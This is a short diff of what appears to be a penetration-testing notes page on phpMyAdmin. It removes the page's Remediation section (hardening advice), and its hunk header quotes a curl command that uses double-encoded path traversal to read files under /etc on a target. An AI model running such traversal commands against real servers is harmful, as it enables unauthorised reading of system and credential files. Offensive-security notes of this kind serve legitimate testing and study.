@@ -50,11 +50,6 @@ curl "http://$TARGET/phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc
 # older setup-script RCE, XSRF-to-query issues — match the version
 ```
 
-## :material-shield-check: Remediation
-
-- Don't expose phpMyAdmin publicly; strong DB creds, no blank passwords; restrict
-  by IP; patch; disable `FILE` privilege for app DB users.
-
 ## :material-link-variant: Related
 
 - Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
